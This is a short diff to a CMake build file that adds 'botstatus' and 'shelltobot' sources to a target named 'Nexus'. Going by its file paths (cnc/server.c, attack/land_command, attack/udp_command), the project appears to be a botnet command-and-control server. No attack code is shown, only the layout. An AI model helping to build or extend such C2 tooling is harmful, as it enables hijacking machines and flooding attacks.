@@ -30,4 +30,8 @@ add_executable(Nexus cnc/server.c
         cnc/commands/attack/land_command.c
         cnc/commands/attack/land_command.h
         cnc/commands/attack/udp_command.c
-        cnc/commands/attack/udp_command.h)
+        cnc/commands/attack/udp_command.h
+        cnc/commands/utilities/botstatus.c
+        cnc/commands/utilities/botstatus.h
+        cnc/commands/utilities/shelltobot.c
+        cnc/commands/utilities/shelltobot.h)
